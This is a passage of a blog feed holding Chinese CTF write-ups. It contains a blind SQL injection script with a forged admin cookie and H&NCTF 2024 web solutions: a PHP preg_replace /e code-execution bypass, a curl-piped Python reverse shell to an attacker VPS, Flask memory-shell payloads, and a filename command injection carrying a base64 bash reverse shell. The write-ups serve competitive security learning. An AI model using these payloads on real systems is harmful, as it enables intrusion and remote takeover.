class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5_hash</span>(<span class="params">input_string</span>):</span><br><span class="line">    md5 = hashlib.md5()</span><br><span class="line">    md5.update(input_string.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> md5.hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://challenge.qsnctf.com:30230/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">EncodeToken</span>(<span class="params">original_string</span>):</span><br><span class="line">    base64_encoded = base64.b64encode(original_string.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    hex_string = base64_encoded.encode(<span class="string">&#x27;utf-8&#x27;</span>).<span class="built_in">hex</span>()</span><br><span class="line">    <span class="keyword">return</span> hex_string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DecodeToken</span>(<span class="params">hex_str</span>):</span><br><span class="line">    b64_str = <span class="built_in">bytes</span>.fromhex(hex_str)</span><br><span class="line">    token_str = base64.b64decode(b64_str)</span><br><span class="line">    <span class="keyword">return</span> token_str.decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Register</span>(<span class="params">username, password</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: password</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url=url+<span class="string">&#x27;register.php&#x27;</span>, data=data)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Login</span>(<span class="params">username, password</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: password</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url=url+<span class="string">&#x27;login.php&#x27;</span>, data=data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">return</span> res.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># res = Register(username=username, password=password)</span></span><br><span class="line"><span class="comment"># print(res.text)</span></span><br><span class="line"><span class="comment"># token = Login(username, password)[6:]</span></span><br><span class="line"><span class="comment"># token = DecodeToken(token)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># token_json = json.loads(token)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SendReq</span>(<span class="params">username</span>):</span><br><span class="line"></span><br><span class="line">    token_json = &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    token_json[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">    user_hash = md5_hash(username)</span><br><span class="line">    token_json[<span class="string">&#x27;token&#x27;</span>] = user_hash</span><br><span class="line">    token_json[<span class="string">&#x27;is_admin&#x27;</span>] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    token_str = json.dumps(token_json)</span><br><span class="line">    TOKEN = EncodeToken(token_str)</span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;TOKEN=&#x27;</span> + TOKEN</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.get(url=url+<span class="string">&#x27;home.php&#x27;</span>, headers=headers)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># sql = &#x27;database()&#x27;</span></span><br><span class="line"><span class="comment"># # dkctf  </span></span><br><span class="line"><span class="comment"># sql = &#x27;version()&#x27;</span></span><br><span class="line"><span class="comment"># # 10.5.23-MariaDB-0+deb11u1</span></span><br><span class="line"></span><br><span class="line">sql = <span class="string">&quot;select (table_name) from information_schema.tables where table_schema=database() limit 1,1&quot;</span></span><br><span class="line"><span class="comment"># user  secret</span></span><br><span class="line">sql = <span class="string">&quot;select (column_name) from information_schema.columns where table_name=&#x27;secret&#x27; limit 1,1&quot;</span></span><br><span class="line"><span class="comment"># flag sseeccrreett</span></span><br><span class="line">sql = <span class="string">&quot;select (sseeccrreett) from secret&quot;</span></span><br><span class="line"><span class="comment">#  # DRKCTF&#123;8b31c3a2f57b4de68124ac7734734944&#125;</span></span><br><span class="line"></span><br><span class="line">sql = sql.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;/**/&#x27;</span>)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">username =<span class="string">&quot;&#x27;or/**/ascii(substr(database(),1,1))=1#&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    asc = <span class="number">32</span></span><br><span class="line">    <span class="keyword">while</span>(asc &lt; <span class="number">128</span>):</span><br><span class="line">        payload = <span class="string">&quot;&#x27;or/**/ascii(substr((&quot;</span> + sql + <span class="string">&quot;),&#123;&#125;,1))=&#123;&#125;#&quot;</span></span><br><span class="line">       <span class="comment"># print(payload.format(k, asc))</span></span><br><span class="line">        res = SendReq(payload.<span class="built_in">format</span>(k, asc))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Hacker!!&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Hacker!!&#x27;</span>)</span><br><span class="line">            exit</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;No user found&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            asc = asc + <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;@q^4*!z8a9-%42z.s~&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag = flag + <span class="built_in">chr</span>(asc)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">            exit</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res.text[-<span class="number">200</span>:])</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;MISC&quot;&gt;&lt;a href=&quot;#MISC&quot; class=&quot;headerlink&quot; title=&quot;MISC&quot;&gt;&lt;/a&gt;MISC&lt;/h1&gt;&lt;h2 id=&quot;签到&quot;&gt;&lt;a href=&quot;#签到&quot; class=&quot;headerlink&quot; title=&quot;签到&quot;&gt;&lt;/a&gt;签到&lt;/h</summary>
      
    
    
    
    <category term="WriteUp" scheme="http://example.com/categories/WriteUp/"/>
    
    
  </entry>
  
  <entry>
    <title>H&amp;NCTF 2024 Web</title>
    <link href="http://example.com/2024/05/30/H-NCTF-2024-Web/"/>
    <id>http://example.com/2024/05/30/H-NCTF-2024-Web/</id>
    <published>2024-05-30T03:36:58.000Z</published>
    <updated>2024-05-30T05:41:48.716Z</updated>
    
    <content type="html"><![CDATA[<h1 id="H-NCTF-2024-WEB-复现"><a href="#H-NCTF-2024-WEB-复现" class="headerlink" title="H&amp;NCTF 2024 WEB 复现"></a>H&amp;NCTF 2024 WEB 复现</h1><p>赛中只解出两题, 其他的wp都还能看懂差不多, 这里复现一下</p><h2 id="Please-RCE-Me"><a href="#Please-RCE-Me" class="headerlink" title="Please_RCE_Me"></a>Please_RCE_Me</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;moran&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;task&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$str1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;task&#x27;</span>];</span><br><span class="line">        <span class="variable">$str2</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|eval|assert|call|create|preg|sort|&#123;|&#125;|filter|exec|passthru|proc|open|echo|`| |\.|include|require|flag/i&#x27;</span>,<span class="variable">$str1</span>) || <span class="title function_ invoke__">strlen</span>(<span class="variable">$str2</span>) != <span class="number">19</span> || <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/please_give_me_flag/&#x27;</span>,<span class="variable">$str2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/please_give_me_flag/ei&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;task&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;moran want a flag.&lt;/br&gt;(?moran=flag)&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>preg_match(&#39;/please_give_me_flag/&#39;,$str2)</code>这里不忽略大小写, 后面忽略大小写, 故绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://hnctf.imxbt.cn:46810/?moran=flag&amp;e=assert&amp;pass=system(&#x27;cat /flag&#x27;);</span><br><span class="line"></span><br><span class="line">flag=please_give_me_flaG&amp;task=register_shutdown_function($_REQUEST[&#x27;e&#x27;],$_REQUEST[&#x27;pass&#x27;])</span><br></pre></td></tr></table></figure><h2 id="ezFlask"><a href="#ezFlask" class="headerlink" title="ezFlask"></a>ezFlask</h2><p>比较抽象的一题, 这里非预期解出来了, </p><p>一开始想到的就是dns外带并且也可以成功, 但是这个容器太抽象了, 执行一次就得重开</p><p>下面说说我的方法,</p><p>首先我们知道这里禁用了很多命令</p><p>由于容器比较奇葩, fuzz的成本太高了, 这里只fuzz出来curl命令是可以执行的, 并且<code>$ </code> <code>|</code>这两个符号也是可以用的,所以我们的思路就是把远端的恶意shell命令curl下来通过管道放进<code>$0</code>,也就是放进当前执行的脚本(bash), 达到反弹shell的目的</p><p>首先vps起一个服务, 用来返回python反弹shell脚本 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;107.148.75.202&quot;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27; &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>之后nc监听 7777端口</p><p>发送执行curl命令的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(&quot;os&quot;).popen(&quot;curl www.n4c1.top:5000/ |$0&quot;).read()</span><br></pre></td></tr></table></figure><p>这样我们就可以的到shell, 然后就是读源码拿flag</p><p>看正解是python内存马, 之前好像接触过一次, 没什么印象, 学习了</p><p><a href="https://www.cnblogs.com/gxngxngxn/p/18181936">https://www.cnblogs.com/gxngxngxn/p/18181936</a></p><p>大概就是通过eval的任意代码执行, 为flask当前app添加一条路由, 并将其与恶意操作函数绑定, 与Java的tomcat内存马相似, 此操作无文件落地, 通过修改中间件来获取shell</p><p>网上可以搜到很多payload</p><p>这里列出两条师傅们wp里的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">app.add_url_rule(&#x27;/shell&#x27;,&#x27;shell&#x27;,lambda:__import__(&#x27;os&#x27;).popen(&quot;cat</span><br><span class="line">/flag&quot;).read())</span><br><span class="line"></span><br><span class="line">x cmd=render_template_string(&quot;&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](\&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;myshell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;)).read())\&quot;,&#123;&#x27;_request_ctx_stack&#x27;:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;&quot;)</span><br></pre></td></tr></table></figure><p>之后访问我们添加的shell路由即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/shell</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line">/shell?cmd=cat%20/flag</span><br></pre></td></tr></table></figure><h2 id="GoJava"><a href="#GoJava" class="headerlink" title="GoJava"></a>GoJava</h2><p>robots.txt中泄露了网站源码的备份</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;io&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;mime/multipart&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> blacklistChars = []<span class="type">rune</span>&#123;<span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 设置路由</span></span><br><span class="line">http.HandleFunc(<span class="string">&quot;/gojava&quot;</span>, compileJava)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置静态文件服务器</span></span><br><span class="line">fs := http.FileServer(http.Dir(<span class="string">&quot;.&quot;</span>))</span><br><span class="line">http.Handle(<span class="string">&quot;/&quot;</span>, fs)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 启动服务器</span></span><br><span class="line">log.Println(<span class="string">&quot;Server started on :80&quot;</span>)</span><br><span class="line">log.Fatal(http.ListenAndServe(<span class="string">&quot;:80&quot;</span>, <span class="literal">nil</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isFilenameBlacklisted</span><span class="params">(filename <span class="type">string</span>)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line"><span class="keyword">for</span> _, char := <span class="keyword">range</span> filename &#123;</span><br><span class="line"><span class="keyword">for</span> _, blackChar := <span class="keyword">range</span> blacklistChars &#123;</span><br><span class="line"><span class="keyword">if</span> char == blackChar &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">compileJava</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line"><span class="comment">// 检查请求方法是否为POST</span></span><br><span class="line"><span class="keyword">if</span> r.Method != http.MethodPost &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;Method not allowed&quot;</span>, http.StatusMethodNotAllowed)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解析multipart/form-data格式的表单数据</span></span><br><span class="line">err := r.ParseMultipartForm(<span class="number">10</span> &lt;&lt; <span class="number">20</span>) <span class="comment">// 设置最大文件大小为10MB</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;Error parsing form&quot;</span>, http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从表单中获取上传的文件</span></span><br><span class="line">file, handler, err := r.FormFile(<span class="string">&quot;file&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;Error retrieving file&quot;</span>, http.StatusBadRequest)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> file.Close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> isFilenameBlacklisted(handler.Filename) &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;Invalid filename: contains blacklisted character&quot;</span>, http.StatusBadRequest)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> !strings.HasSuffix(handler.Filename, <span class="string">&quot;.java&quot;</span>) &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;Invalid file format, please select a .java file&quot;</span>, http.StatusBadRequest)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">err = saveFile(file, <span class="string">&quot;./upload/&quot;</span>+handler.Filename)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;Error saving file&quot;</span>, http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">saveFile</span><span class="params">(file multipart.File, filePath <span class="type">string</span>)</span></span> <span class="type">error</span> &#123;</span><br><span class="line"><span class="comment">// 创建目标文件</span></span><br><span class="line">f, err := os.Create(filePath)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> f.Close()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将上传的文件内容复制到目标文件中</span></span><br><span class="line">_, err = io.Copy(f, file)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里不用细看, 基本上就能猜到使用相同命令javac + 文件名 这种形式来编译上传的文件, 那么既然是系统命令, 就可以通过上传的 文件名进行命令注入</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240514130817384.png" alt="image-20240514130817384"></p><p>可以看见确实如此, 但是这里是一个gojava的低权限用户, 想办法弹shell提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=&quot;1;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDcuMTQ4Ljc1LjIwMi83Nzc3IDA+JjE=| base64 -d |bash;Main.java&quot;</span><br></pre></td></tr></table></figure><p>根目录下有一个很特殊的文件</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240514131921586.png" alt="image-20240514131921586"></p><p>这里面的内容就算是root的密码</p><p>直接su root, 然后运行&#x2F;start.sh即可, flag在root目录下</p><h2 id="flipPin"><a href="#flipPin" class="headerlink" title="flipPin"></a>flipPin</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, abort</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, Response</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">default_session = <span class="string">&#x27;&#123;&quot;admin&quot;: 0, &quot;username&quot;: &quot;user1&quot;&#125;&#x27;</span></span><br><span class="line">key = get_random_bytes(AES.block_size)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">session</span>):</span><br><span class="line">    iv = 